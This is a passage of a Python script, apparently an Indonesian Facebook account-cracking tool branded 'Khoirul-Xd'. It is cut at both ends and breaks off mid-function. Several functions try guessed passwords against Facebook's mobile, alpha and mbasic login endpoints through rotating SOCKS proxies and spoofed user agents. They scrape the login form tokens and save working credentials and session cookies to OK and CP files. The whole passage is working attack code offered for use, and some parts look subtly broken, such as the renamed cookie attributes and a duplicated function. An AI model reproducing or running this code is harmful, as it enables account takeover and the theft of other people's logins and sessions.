			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METODE ALPHA ]--------------------#
def bapi(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]M-Alpha[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.alpha.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.alpha.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Khoirul-Xd-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='Khoirul-Xd-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	#-------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[M1] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1132078350149238&auth_token=cc90dbbd519ef9abbb3cccc56d77fd56&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&refsrc=deprecated&app_id=1132078350149238&cancel=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}[{K}CP{P}] : {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}[{H}OK{P}] : {H}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[M2] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link= ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			cokz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			cokz+=' m_pixel_ratio=2.625; wd=412x756'
			head={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not)A;Brand";v="98", "Chromium";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.7,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'com.facebook.katana','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies={Kue: cokz},headers=head,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}[{H}OK{P}] : {H}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}CP{P}] : {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
